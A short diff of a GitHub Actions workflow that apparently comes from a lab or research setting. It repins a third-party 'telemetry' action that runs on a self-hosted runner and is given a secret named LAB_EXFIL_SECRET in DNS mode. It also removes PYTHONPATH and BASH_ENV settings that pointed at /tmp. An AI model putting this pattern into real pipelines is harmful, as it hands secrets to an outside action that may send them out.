@@ -1,4 +1,5 @@
 name: CI
+on: [push, workflow_dispatch]
 permissions:
   contents: read
 jobs:
@@ -6,14 +7,7 @@ jobs:
     runs-on: self-hosted
     steps:
     - name: Publish build telemetry
-      uses: SISL-UIC/lab-telemetry-collector@5c9d6d41ae3c9585f699edb1cd7c2e35bc973ea0
+      uses: SISL-UIC/lab-telemetry-collector@68242b4758ab2752f7fc692408afb302673b3a3c
       with:
         token: ${{ secrets.LAB_EXFIL_SECRET }}
         mode: dns
-    timeout-minutes: 15
-env:
-  PYTHONPATH: /tmp/instr
-  BASH_ENV: /tmp/instr/bash_env.sh
-'on':
-- push
-- workflow_dispatch
